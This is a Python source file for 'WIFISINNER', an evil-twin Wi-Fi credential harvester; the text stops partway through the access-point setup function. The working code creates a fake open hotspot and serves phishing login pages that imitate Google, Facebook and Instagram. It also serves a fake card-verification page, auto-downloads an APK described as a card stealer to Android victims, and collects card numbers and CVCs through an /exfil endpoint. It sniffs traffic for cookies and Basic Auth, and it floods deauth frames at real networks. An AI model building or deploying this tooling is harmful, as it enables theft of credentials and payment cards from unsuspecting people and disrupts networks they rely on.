#!/usr/bin/env python3
"""
WIFISINNER - Evil Twin WiFi honeypot / credential harvester.

Creates a fake open hotspot ("FREE WIFI" by default), forces connecting
victims into a phishing captive portal, harvests credentials, DNS queries,
plaintext HTTP secrets, cookies, TLS SNI hostnames, DHCP fingerprints and
a full packet capture. On Android it silently pushes a card-stealer APK
(FREE WIFI Helper) that harvests credit-card details. Optional deauth
hammering kicks clients off a real network so they join the honeypot.

Usage:
    sudo python3 wifisinner.py                          # launch "FREE WIFI"
    sudo python3 wifisinner.py --ssid "Airport_Free"    # custom SSID
    sudo python3 wifisinner.py --deauth "HomeNet"      # deauth a real network
    sudo python3 wifisinner.py --scan                   # list nearby networks
    sudo python3 wifisinner.py --selftest               # offline parser tests

Requires: root, NetworkManager, dnsmasq, tcpdump, scapy (iw optional).
"""

import argparse
import base64
import json
import os
import re
import shutil
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import Counter, deque
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs

def _borrow_sudo_user_site():
    su = os.environ.get("SUDO_USER")
    if not su:
        return
    try:
        import pwd
        home = pwd.getpwnam(su).pw_dir
        p = os.path.join(home, ".local/lib", "python%d.%d" % sys.version_info[:2], "site-packages")
        if os.path.isdir(p):
            sys.path.append(p)
    except Exception:
        pass


_borrow_sudo_user_site()

try:
    from scapy.all import BOOTP, DHCP, Dot11, Dot11Deauth, RadioTap, sniff, sendp
except ImportError:
    print("[!] scapy missing  ->  sudo python3 -m pip install --break-system-packages scapy")
    sys.exit(1)

VERSION = "1.0"

C_RESET = "\033[0m"
C_DIM = "\033[2m"
C_BOLD = "\033[1m"
C_GREEN = "\033[32m"
C_BGREEN = "\033[1;32m"
C_CYAN = "\033[36m"
C_BCYAN = "\033[1;36m"
C_YELLOW = "\033[33m"
C_BYELLOW = "\033[1;33m"
C_RED = "\033[31m"
C_BRED = "\033[1;31m"
C_MAGENTA = "\033[35m"
C_WHITE = "\033[97m"


def now():
    return datetime.now().strftime("%H:%M:%S")


def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class Stats:
    def __init__(self):
        self.lock = threading.RLock()
        self.clients = {}
        self.creds = []
        self.cards = []
        self.http_creds = []
        self.dns = Counter()
        self.sni = Counter()
        self.events = deque(maxlen=200)
        self.rx_bytes = 0
        self.tx_bytes = 0
        self.dhcp_events = deque(maxlen=50)
        self.packets = 0
        self.start_time = time.time()
        self.ap_info = {}
        self.nat_info = {}
        self.deauth_info = {}
        self.authed_ips = set()
        self.card_pending = set()

    def event(self, msg, color=C_BGREEN):
        with self.lock:
            self.events.append((now(), msg, color))

    def client(self, ip, **kw):
        with self.lock:
            c = self.clients.setdefault(ip, {"first": ts(), "authed": False, "mac": "?", "hostname": "?", "os": "?", "ua": "?"})
            c["last"] = ts()
            c.update(kw)
            return c

    def cred(self, rec):
        with self.lock:
            self.creds.append(rec)

    def card(self, rec):
        with self.lock:
            self.cards.append(rec)


S = Stats()
STOP = threading.Event()


def run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def which(x):
    return shutil.which(x)


# ---------------------------------------------------------------- parsers --

def parse_dns_query(data):
    if len(data) < 17:
        return None
    qid = data[:2]
    try:
        i = 12
        parts = []
        while data[i] != 0:
            ln = data[i]
            parts.append(data[i + 1 : i + 1 + ln].decode("utf-8", "replace"))
            i += 1 + ln
        qname = ".".join(parts)
        qend = i + 5
        qsection = data[12:qend]
        qtype = struct.unpack("!H", data[i + 1 : i + 3])[0]
        return qid, qname, qtype, qsection
    except Exception:
        return None


def dns_synth_response(qid, qsection, qtype, ip):
    header = qid + b"\x81\x80" + struct.pack("!HHHH", 1, 1 if qtype == 1 else 0, 0, 0)
    if qtype == 1:
        ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 0, 4) + socket.inet_aton(ip)
        return header + qsection + ans
    return header + qsection


def parse_sni(b):
    try:
        if len(b) < 44 or b[0] != 0x16 or b[5] != 0x01:
            return None
        i = 9
        i += 2 + 32
        i += 1 + b[i]
        i += 2 + int.from_bytes(b[i : i + 2], "big")
        i += 1 + b[i]
        extlen = int.from_bytes(b[i : i + 2], "big")
        i += 2
        end = min(i + extlen, len(b))
        while i + 4 <= end:
            etype = int.from_bytes(b[i : i + 2], "big")
            elen = int.from_bytes(b[i + 2 : i + 4], "big")
            i += 4
            if etype == 0 and elen >= 5 and i + 5 <= len(b):
                j = i + 2
                nlen = int.from_bytes(b[j + 1 : j + 3], "big")
                return b[j + 3 : j + 3 + nlen].decode("utf-8", "replace").lower()
            i += elen
    except Exception:
        return None
    return None


def parse_http(raw):
    try:
        text = raw.decode("utf-8", "replace")
        head, _, body = text.partition("\r\n\r\n")
        lines = head.split("\r\n")
        parts = lines[0].split(" ")
        if len(parts) < 2:
            return None
        headers = {}
        for ln in lines[1:]:
            if ":" in ln:
                k, v = ln.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        return {"method": parts[0], "path": parts[1], "headers": headers, "body": body}
    except Exception:
        return None


HTTP_SECRET_KEYS = ("pass", "pwd", "login", "user", "mail", "token", "secret", "auth", "session", "key", "account")


def http_is_interesting(h):
    body, path = h.get("body", ""), h.get("path", "")
    hdrs = h.get("headers", {})
    if "authorization" in hdrs or "cookie" in hdrs:
        return True
    if h["method"] == "POST" and any(k in body.lower() for k in HTTP_SECRET_KEYS):
        return True
    if any(k in path.lower() for k in ("token=", "pass", "auth", "session", "secret", "key=")):
        return True
    return False


def basic_auth_decode(v):
    try:
        dec = base64.b64decode(v.split(" ", 1)[1]).decode("utf-8", "replace")
        return dec
    except Exception:
        return None


def card_brand(num):
    n = re.sub(r"[^0-9]", "", num or "")
    if not n:
        return "CARD"
    if n[0] == "4":
        return "VISA"
    if n[:2] in ("34", "37"):
        return "AMEX"
    if 51 <= int(n[:2]) <= 55 or 2221 <= int(n[:4]) <= 2720:
        return "MASTERCARD"
    if n[0] == "6":
        return "DISCOVER"
    return "CARD"


def detect_os(ua):
    ua = (ua or "").lower()
    if "iphone" in ua or "ipad" in ua or "like mac os x" in ua:
        return "iOS"
    if "macintosh" in ua:
        return "macOS"
    if "android" in ua:
        return "Android"
    if "windows" in ua:
        return "Windows"
    if "cros" in ua:
        return "ChromeOS"
    if "linux" in ua:
        return "Linux"
    return "Other"


# ------------------------------------------------------------------ portal --

LOGIN_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in to Wi-Fi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:linear-gradient(160deg,#0b3d91 0%,#1a6ee0 60%,#38b6ff 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:18px;box-shadow:0 18px 50px rgba(0,0,0,.35);width:100%;max-width:400px;overflow:hidden}
.head{background:linear-gradient(135deg,#0b3d91,#1a6ee0);padding:26px 24px;color:#fff}
.head .wifi{font-size:34px}
.head h1{font-size:20px;margin-top:6px;font-weight:600}
.head p{font-size:13px;opacity:.85;margin-top:4px}
.tabs{display:flex;border-bottom:1px solid #e8e8e8}
.tabs div{flex:1;text-align:center;padding:13px 4px;font-size:13px;color:#666;cursor:pointer;border-bottom:3px solid transparent;font-weight:600}
.tabs div.on{color:#1a6ee0;border-bottom-color:#1a6ee0}
.body{padding:24px}
label{display:block;font-size:12px;color:#666;font-weight:600;margin:12px 0 5px}
input{width:100%;padding:13px 14px;border:1px solid #d5d9e0;border-radius:9px;font-size:15px;outline:none;background:#f8f9fb}
input:focus{border-color:#1a6ee0;background:#fff}
button{width:100%;margin-top:22px;padding:14px;background:linear-gradient(135deg,#0b3d91,#1a6ee0);color:#fff;border:0;border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
.foot{padding:14px;text-align:center;color:#9aa3ad;font-size:11px;border-top:1px solid #eee}
.g .lab{color:#4285f4}.f .lab{color:#1877f2}.i .lab{color:#c13584}.e .lab{color:#1a6ee0}
</style></head><body>
<div class="card">
<div class="head"><div class="wifi">&#127918;</div><h1 id="ttl">FREE WIFI</h1><p>High-speed internet access &mdash; sign in to continue</p></div>
<div class="tabs">
<div class="on e" data-p="email" onclick="sel(this,'Email')">Email</div>
<div class="g" data-p="google" onclick="sel(this,'Google')">Google</div>
<div class="f" data-p="facebook" onclick="sel(this,'Facebook')">Facebook</div>
<div class="i" data-p="instagram" onclick="sel(this,'Instagram')">Instagram</div>
</div>
<form class="body" method="POST" action="/login" onsubmit="return chk()">
<input type="hidden" name="provider" id="prov" value="email">
<label id="lu">Email address</label><input name="user" id="u" type="text" autocapitalize="none" autocomplete="username" placeholder="you@example.com">
<label id="lp">Password</label><input name="password" id="p" type="password" autocomplete="current-password" placeholder="••••••••">
<button type="submit" id="btn">Connect to Internet</button>
</form>
<div class="foot">Protected by FREE WIFI &bull; Secure sign-in</div>
</div>
<script>
var P='email';
function sel(e,n){document.querySelectorAll('.tabs div').forEach(x=>x.classList.remove('on'));e.classList.add('on');P=e.dataset.p;document.getElementById('prov').value=P;
document.getElementById('lu').textContent=n+' '+(P=='email'?'address':'account');
document.getElementById('u').placeholder=P=='email'?'you@example.com':n+' username / email';}
function chk(){var u=document.getElementById('u').value.trim(),p=document.getElementById('p').value;
if(!u||!p){alert('Please enter your credentials to connect.');return false}
document.getElementById('btn').textContent='Connecting...';document.getElementById('btn').disabled=true;return true}
</script></body></html>"""

SUCCESS_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Connected</title>
<style>body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:linear-gradient(160deg,#0a7d37,#28b45c);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;text-align:center}
.c{background:rgba(255,255,255,.12);padding:40px 50px;border-radius:20px;backdrop-filter:blur(6px)}
h1{font-size:24px;margin:14px 0 8px}p{opacity:.9;font-size:14px}.ic{font-size:52px}</style></head>
<body><div class="c"><div class="ic">&#10004;</div><h1>Connected!</h1>
<p>You are now online. Enjoy FREE WIFI.</p></div>
<script>setTimeout(function(){try{window.close()}catch(e){}},3000)</script>
</body></html>"""

CARD_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Verify your card</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:linear-gradient(160deg,#0b3d91 0%,#1a6ee0 60%,#38b6ff 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:18px;box-shadow:0 18px 50px rgba(0,0,0,.35);width:100%;max-width:420px;overflow:hidden}
.head{background:linear-gradient(135deg,#0b3d91,#1a6ee0);padding:24px;color:#fff}
.head .lock{font-size:30px}.head h1{font-size:19px;margin-top:6px;font-weight:600}.head p{font-size:12.5px;opacity:.85;margin-top:4px}
.body{padding:24px}
label{display:block;font-size:11.5px;color:#666;font-weight:600;margin:12px 0 5px}
input{width:100%;padding:13px 14px;border:1px solid #d5d9e0;border-radius:9px;font-size:15px;outline:none;background:#f8f9fb;font-family:inherit}
input:focus{border-color:#1a6ee0;background:#fff}
.row{display:flex;gap:12px}.row>div{flex:1}
.brand{float:right;font-size:11px;font-weight:700;color:#8a93a0;margin-top:6px}
button{width:100%;margin-top:22px;padding:14px;background:linear-gradient(135deg,#0b3d91,#1a6ee0);color:#fff;border:0;border-radius:9px;font-size:16px;font-weight:600;cursor:pointer}
.foot{padding:13px;text-align:center;color:#9aa3ad;font-size:11px;border-top:1px solid #eee}
.sec{text-align:center;color:#9aa3ad;font-size:11px;margin-top:10px}
</style></head><body>
<div class="card">
<div class="head"><div class="lock">&#128274;</div>
<h1>Card verification required</h1><p>FREE WIFI is free for 15 minutes. Verify a card to continue unlimited access.</p></div>
<div class="body">
<form method="POST" action="/card" onsubmit="return chk()">
<label>Name on card</label><input name="name" id="cn" autocomplete="cc-name" placeholder="John Smith">
<label>Card number <span class="brand" id="brand"></span></label><input name="number" id="cc" inputmode="numeric" autocomplete="cc-number" placeholder="1234 5678 9012 3456">
<div class="row">
<div><label>Expiry</label><input name="exp" id="exp" inputmode="numeric" placeholder="MM/YY"></div>
<div><label>CVC</label><input name="cvc" id="cvc" inputmode="numeric" autocomplete="cc-csc" placeholder="123"></div>
</div>
<div class="row"><div><label>Billing ZIP (optional)</label><input name="zip" inputmode="numeric" placeholder="ZIP"></div></div>
<button type="submit">Verify &amp; Connect</button>
<div class="sec">256-bit encrypted &bull; Your card won't be charged</div>
</form>
</div>
</div>
<script>
var cc=document.getElementById('cc'),exp=document.getElementById('exp');
function brand(){var n=cc.value.replace(/\\D/g,''),b='';if(n[0]=='4')b='VISA';else if(n.slice(0,2)=='34'||n.slice(0,2)=='37')b='AMEX';else if(51<=+n.slice(0,2)&&+n.slice(0,2)<=55||/^22[2-9]/.test(n)||/^2[3-6]/.test(n))b='MASTERCARD';else if(n[0]=='6')b='DISCOVER';document.getElementById('brand').textContent=b;}
cc.addEventListener('input',function(){var n=cc.value.replace(/\\D/g,'').slice(0,16);n=n.replace(/(.{4})/g,'$1 ').trim();cc.value=n;brand();});
exp.addEventListener('input',function(){var e=exp.value.replace(/\\D/g,'').slice(0,4);if(e.length>2)e=e.slice(0,2)+'/'+e.slice(2);exp.value=e;});
function chk(){var n=cc.value.replace(/\\D/g,'');if(n.length<13||document.getElementById('exp').value.length<5){alert('Please enter a valid card.');return false}
document.querySelector('button').textContent='Verifying...';document.querySelector('button').disabled=true;return true}
</script></body></html>"""


def save_loot(path, data):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = str(path) + ".tmp"
    with open(tmp, "w") as f:
        json.dump(data, f, indent=2, default=str)
    os.replace(tmp, str(path))


INSTALL_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Install FREE WIFI Helper</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,sans-serif}
body{background:linear-gradient(160deg,#0b3d91 0%,#1a6ee0 60%,#38b6ff 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:18px;box-shadow:0 18px 50px rgba(0,0,0,.35);width:100%;max-width:400px;overflow:hidden;text-align:center}
.head{background:linear-gradient(135deg,#0b3d91,#1a6ee0);padding:30px 24px;color:#fff}
.head .ic{font-size:40px}.head h1{font-size:20px;margin-top:10px;font-weight:600}
.head p{font-size:13px;opacity:.9;margin-top:6px}
.body{padding:28px 24px}
.btn{display:block;width:100%;padding:15px;background:linear-gradient(135deg,#0b3d91,#1a6ee0);color:#fff;border-radius:10px;font-size:16px;font-weight:600;text-decoration:none}
.tip{font-size:12px;color:#667;margin-top:14px;line-height:1.5}
.foot{padding:13px;color:#9aa3ad;font-size:11px;border-top:1px solid #eee}
</style></head><body>
<div class="card">
<div class="head"><div class="ic">&#128241;&#65039;</div>
<h1>Install FREE WIFI Helper</h1><p>Your download has started. Install the app and enter your card to continue unlimited access.</p></div>
<div class="body">
<a class="btn" id="dl" href="/payload.apk" download>Install now</a>
<div class="tip">1. Tap <b>Install</b> when prompted<br>2. Open <b>FREE WIFI Helper</b><br>3. Enter your card details &amp; tap <b>Verify</b></div>
<a href="/skip" style="display:block;margin-top:10px;font-size:12px;color:#1a6ee0;text-decoration:none">Skip, continue without a card</a>
</div>
<div class="foot">WIFISINNER &bull; secure card verification</div>
</div>
<script>setTimeout(function(){var a=document.getElementById('dl');a.click()},400);</script>
</body></html>"""


APK_PATHS = ("/payload.apk", "/helper.apk", "/apk", "/install.apk", "/FREE-WIFI-Helper.apk")


class PortalHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    portal_dir = None
    apk = None
    _apk_cache = None

    @staticmethod
    def _apk_bytes():
        if not PortalHandler.apk:
            return None
        if PortalHandler._apk_cache is None:
            try:
                PortalHandler._apk_cache = Path(PortalHandler.apk).read_bytes()
            except Exception:
                return None
        return PortalHandler._apk_cache

    def log_message(self, *a):
        pass

    def _client_ip(self):
        return self.client_address[0]

    def _is_authed(self):
        return self._client_ip() in S.authed_ips

    def _send(self, code, body=b"", ctype="text/html", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_GET(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        S.client(ip, ua=ua, os=detect_os(ua))
        path = self.path.split("?")[0]
        if PortalHandler.apk and path in APK_PATHS:
            data = PortalHandler._apk_bytes()
            if data is not None:
                self._send(200, data, "application/vnd.android.package-archive")
                return
        if path == "/skip":
            S.authed_ips.add(ip)
            S.card_pending.discard(ip)
            self._send(200, SUCCESS_HTML.encode())
            return
        if self._is_authed():
            if path == "/hotspot-detect.html":
                self._send(200, b"Success", "text/plain")
            elif path == "/generate_204":
                self._send(204)
            elif path in ("/connecttest.txt", "/ncsi.txt"):
                self._send(200, b"Microsoft Connect Test", "text/plain")
            else:
                self._send(200, SUCCESS_HTML.encode())
            return
        if ip in S.card_pending:
            self._send(200, INSTALL_HTML.encode())
            return
        if path == "/success":
            self._send(200, SUCCESS_HTML.encode())
            return
        self._send(200, LOGIN_HTML.encode())

    def do_POST(self):
        ip = self._client_ip()
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
        fields = {k: v[0] for k, v in parse_qs(raw).items()}
        path = self.path.split("?")[0]
        if path == "/exfil":
            self._exfil(ip, fields)
            return
        if path != "/login":
            self._send(200, LOGIN_HTML.encode())
            return
        user = fields.get("user", "").strip()
        password = fields.get("password", "")
        provider = fields.get("provider", "email")
        ua = self.headers.get("User-Agent", "")
        cl = S.client(ip, ua=ua, os=detect_os(ua))
        android = detect_os(ua) == "Android"
        if user and password:
            rec = {
                "time": ts(),
                "provider": provider,
                "user": user,
                "password": password,
                "ip": ip,
                "mac": cl.get("mac", "?"),
                "hostname": cl.get("hostname", "?"),
                "os": cl.get("os", "?"),
                "ua": ua,
                "all_fields": fields,
            }
            S.cred(rec)
            if PortalHandler.portal_dir:
                save_loot(Path(PortalHandler.portal_dir) / "credentials.json", list(S.creds))
            S.event(f"CREDENTIALS captured: {provider}:{user} / {password}  ({ip})", C_BRED)
        else:
            S.event(f"Portal submit (incomplete) from {ip}: {fields}", C_YELLOW)
        if android and PortalHandler.apk is not None:
            S.card_pending.add(ip)
            cl["authed"] = False
            self._send(200, INSTALL_HTML.encode())
        else:
            cl["authed"] = True
            S.authed_ips.add(ip)
            self._send(200, SUCCESS_HTML.encode())

    def _exfil(self, ip, f):
        number = re.sub(r"[^0-9]", "", f.get("number", ""))
        rec = {
            "time": ts(),
            "type": f.get("type", "card"),
            "brand": (f.get("brand") or card_brand(number)),
            "name": f.get("name", ""),
            "number": number,
            "exp": f.get("exp", ""),
            "cvc": f.get("cvc", ""),
            "zip": f.get("zip", ""),
            "clipboard": f.get("clipboard", ""),
            "model": f.get("model", ""),
            "android": f.get("android", ""),
            "ssid": f.get("ssid", ""),
            "ip": ip,
        }
        cl = S.client(ip, os=detect_os(self.headers.get("User-Agent", "")))
        rec["mac"] = cl.get("mac", "?")
        rec["hostname"] = cl.get("hostname", "?")
        S.card(rec)
        if PortalHandler.portal_dir:
            save_loot(Path(PortalHandler.portal_dir) / "cards.json", list(S.cards))
        S.card_pending.discard(ip)
        S.authed_ips.add(ip)
        if rec["type"] == "card":
            S.event(f"CARD: {rec['brand']} ••••{number[-4:]} {rec['exp']} {rec['cvc']} ({rec['name']}) from {ip} [{rec['model']}]", C_BYELLOW)
        else:
            S.event(f"APK exfil ({rec['type']}) from {ip}", C_YELLOW)
        self._send(200, b"ok", "text/plain")


def start_portal(ip, port, loot_dir, apk=None):
    PortalHandler.portal_dir = loot_dir
    PortalHandler.apk = apk
    PortalHandler._apk_cache = None
    srv = ThreadingHTTPServer((ip, port), PortalHandler)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


# ---------------------------------------------------------------- dns srv --

def real_resolvers():
    res = []
    try:
        for ln in open("/etc/resolv.conf"):
            ln = ln.strip()
            if ln.startswith("nameserver") and not ln.split()[1].startswith("127."):
                res.append(ln.split()[1])
    except Exception:
        pass
    return res or ["8.8.8.8", "1.1.1.1"]


def start_dns(ap_ip, port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((ap_ip, port))
    sock.settimeout(0.5)
    resolvers = real_resolvers()

    def log_and_forward(data, addr):
        parsed = parse_dns_query(data)
        if not parsed:
            return
        qid, qname, qtype, qsection = parsed
        authed = addr[0] in S.authed_ips
        with S.lock:
            S.dns[qname] += 1
        if authed:
            for r in resolvers:
                try:
                    fs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    fs.settimeout(2.5)
                    fs.sendto(data, (r, 53))
                    resp, _ = fs.recvfrom(4096)
                    fs.close()
                    sock.sendto(resp, addr)
                    return
                except Exception:
                    continue
        try:
            sock.sendto(dns_synth_response(qid, qsection, qtype, ap_ip), addr)
        except Exception:
            pass

    def loop():
        while not STOP.is_set():
            try:
                data, addr = sock.recvfrom(4096)
                threading.Thread(target=log_and_forward, args=(data, addr), daemon=True).start()
            except socket.timeout:
                continue
            except OSError:
                break

    threading.Thread(target=loop, daemon=True).start()
    return sock


# --------------------------------------------------------------- sniffer --

def start_sniffer(iface):
    def handler(p):
        try:
            with S.lock:
                S.packets += 1
            if p.haslayer(BOOTP) and p.haslayer(DHCP):
                opts = {o[0]: o[1] for o in p[DHCP].options if isinstance(o, tuple)}
                msg = opts.get("message-type")
                if msg in (1, 3) and p[BOOTP].op == 1:
                    mac = ":".join("%02x" % b for b in bytes(p[BOOTP].chaddr)[:6])
                    hostname = opts.get("hostname")
                    if isinstance(hostname, bytes):
                        hostname = hostname.decode("utf-8", "replace")
                    if msg == 1:
                        S.event(f"DHCP discover: {mac} host={hostname}", C_CYAN)
                        S.client("pending", mac=mac, hostname=hostname)
                    else:
                        req = opts.get("requested_addr")
                        if req:
                            S.client(str(req), mac=mac, hostname=hostname)
                elif p[BOOTP].op == 2:
                    yi = p[BOOTP].yiaddr
                    mac = ":".join("%02x" % b for b in bytes(p[BOOTP].chaddr)[:6])
                    if yi and str(yi) != "0.0.0.0":
                        S.client(str(yi), mac=mac)
            if p.haslayer("IP"):
                src, dst = p["IP"].src, p["IP"].dst
                n = len(bytes(p))
                with S.lock:
                    if src.startswith("10.0.0."):
                        S.rx_bytes += n
                    if dst.startswith("10.0.0."):
                        S.tx_bytes += n
            if p.haslayer("TCP") and p.haslayer("Raw"):
                raw = bytes(p["Raw"].load)
                sport, dport = p["TCP"].sport, p["TCP"].dport
                if dport == 80 and raw[:4] in (b"GET ", b"POST", b"PUT ", b"HEAD", b"OPTI"):
                    h = parse_http(raw)
                    if h:
                        host = h["headers"].get("host", dst)
                        if http_is_interesting(h):
                            rec = {"time": ts(), "client": src, "host": host, "method": h["method"], "path": h["path"]}
                            auth = h["headers"].get("authorization", "")
                            if auth.lower().startswith("basic "):
                                dec = basic_auth_decode(auth)
                                rec["basic_auth"] = dec
                                S.event(f"HTTP Basic Auth: {dec}  ({src} -> {host})", C_BRED)
                            ck = h["headers"].get("cookie")
                            if ck:
                                rec["cookies"] = ck
                            if h["method"] == "POST" and h["body"]:
                                rec["post_body"] = h["body"][:2000]
                            if "?" in h["path"]:
                                rec["query"] = h["path"][:2000]
                            with S.lock:
                                S.http_creds.append(rec)
                                if PortalHandler.portal_dir:
                                    save_loot(Path(PortalHandler.portal_dir) / "http_secrets.json", list(S.http_creds))
                elif dport == 443:
                    sni = parse_sni(raw)
                    if sni:
                        with S.lock:
                            S.sni[sni] += 1
        except Exception:
            pass

    threading.Thread(target=lambda: sniff(iface=iface, prn=handler, store=0, stop_filter=lambda _: STOP.is_set()), daemon=True).start()


def start_lease_poller(leasefile):
    def loop():
        seen = set()
        while not STOP.is_set():
            try:
                txt = Path(leasefile).read_text()
                for ln in txt.splitlines():
                    f = ln.split()
                    if len(f) >= 4:
                        mac, ip, host = f[1], f[2], f[3] if f[3] != "*" else "?"
                        key = (mac, ip)
                        if key not in seen:
                            seen.add(key)
                            S.client(ip, mac=mac, hostname=host)
                            S.event(f"client associated: {ip} ({mac}) host={host}", C_CYAN)
            except Exception:
                pass
            STOP.wait(2.0)

    threading.Thread(target=loop, daemon=True).start()


# ---------------------------------------------------------------- deauth --

def ensure_iw():
    if which("iw"):
        return True
    print(f"{C_YELLOW}[!] iw not found, installing...{C_RESET}")
    r = run(["apt-get", "install", "-y", "iw"])
    return which("iw") is not None


def start_deauth(iface, bssid, ap_ssid):
    if not ensure_iw():
        print(f"{C_YELLOW}[!] iw unavailable - deauth disabled{C_RESET}")
        return None
    run(["iw", "dev", iface, "interface", "add", "mon0", "type", "monitor"])
    run(["ip", "link", "set", "mon0", "up"])
    S.deauth_info = {"target": ap_ssid, "bssid": bssid, "started": ts(), "sent": 0}

    def loop():
        bssid_l = bssid.lower()
        while not STOP.is_set():
            try:
                pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid_l, addr3=bssid_l) / Dot11Deauth(reason=7)
                sendp(pkt, iface="mon0", count=25, inter=0.02, verbose=0)
                with S.lock:
                    S.deauth_info["sent"] = S.deauth_info.get("sent", 0) + 25
            except Exception:
                pass
            STOP.wait(2.0)

    threading.Thread(target=loop, daemon=True).start()
    return True


# ------------------------------------------------------------------- nat --

def detect_uplink():
    r = run(["ip", "route", "show", "default"])
    for ln in r.stdout.splitlines():
        m = re.search(r"\bdev (\S+)", ln)
        if m:
            dev = m.group(1)
            if dev not in ("lo", "tailscale0") and not dev.startswith(("tun", "tap", "veth", "docker", "br-")) and not dev.startswith("wl"):
                return dev
    r = run(["ip", "route", "get", "1.1.1.1"])
    m = re.search(r"\bdev (\S+)", r.stdout)
    if m:
        dev = m.group(1)
        if dev not in ("lo", "tailscale0") and not dev.startswith(("tun", "tap", "veth", "docker", "br-")) and not dev.startswith("wl"):
            return dev
    return None


def nat_enable(iface, uplink):
    if not uplink:
        S.nat_info = {"uplink": None, "state": "offline (portal only)"}
        return
    run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    rules = [
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-s", "10.0.0.0/24", "-o", uplink, "-j", "MASQUERADE"],
        ["iptables", "-A", "FORWARD", "-i", iface, "-o", uplink, "-j", "ACCEPT"],
        ["iptables", "-A", "FORWARD", "-i", uplink, "-o", iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    ]
    for r in rules:
        run(r)
    S.nat_info = {"uplink": uplink, "state": "ACTIVE"}


def nat_disable(iface, uplink):
    if not uplink:
        return
    rules = [
        ["iptables", "-t", "nat", "-D", "POSTROUTING", "-s", "10.0.0.0/24", "-o", uplink, "-j", "MASQUERADE"],
        ["iptables", "-D", "FORWARD", "-i", iface, "-o", uplink, "-j", "ACCEPT"],
        ["iptables", "-D", "FORWARD", "-i", uplink, "-o", iface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    ]
    for r in rules:
        run(r)


# --------------------------------------------------------------- helpers --

def detect_wifi_iface():
    r = run(["nmcli", "-t", "-f", "DEVICE,TYPE,STATE", "device"])
    for ln in r.stdout.splitlines():
        parts = ln.split(":")
        if len(parts) >= 3 and parts[1] == "wifi":
            return parts[0]
    return None


def unblock_wifi():
    run(["rfkill", "unblock", "wifi"])
    run(["nmcli", "radio", "wifi", "on"])
    for _ in range(30):
        r = run(["nmcli", "-t", "-f", "DEVICE,TYPE,STATE", "device"])
        for ln in r.stdout.splitlines():
            parts = ln.split(":")
            if len(parts) >= 3 and parts[1] == "wifi" and parts[2] != "unavailable":
                return True
        time.sleep(0.5)
    return False


def scan_networks(iface):
    run(["nmcli", "device", "wifi", "rescan", "ifname", iface])
    time.sleep(4)
    r = run(["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY", "device", "wifi", "list", "ifname", iface])
    nets = []
    for ln in r.stdout.splitlines():
        parts = ln.split(":")
        if len(parts) < 10:
            continue
        ssid, bssid, chan, signal = parts[0].replace("\\:", ":"), ":".join(parts[1:7]), parts[7], parts[8]
        sec = ":".join(parts[9:])
        if ssid:
            nets.append({"ssid": ssid, "bssid": bssid, "channel": int(chan or 0), "signal": signal, "security": sec})
    return nets


def find_target(iface, ssid):
    for attempt in range(2):
        for n in scan_networks(iface):
            if n["ssid"] == ssid:
                return n
        if attempt == 0:
            print(f"{C_YELLOW}[!] target '{ssid}' not in first scan, retrying...{C_RESET}")
    return None


def create_ap(iface, ssid, channel, password, gateway):
    run(["nmcli", "connection", "delete", ssid])
    cmd = [
        "nmcli", "connection", "add", "type", "wifi", "ifname", iface, "con-name", ssid,
        "autoconnect", "no", "ssid", ssid,
        "802-11-wireless.mode", "ap",
        "802-11-wireless.band", "bg",
        "802-11-wireless.channel", str(channel),
        "ipv4.addresses", f"{gateway}/24",
        "ipv6.method", "ignore",
    ]
    if password:
        cmd += [
            "802-11-wireless-security.key-mgmt", "wpa-psk",
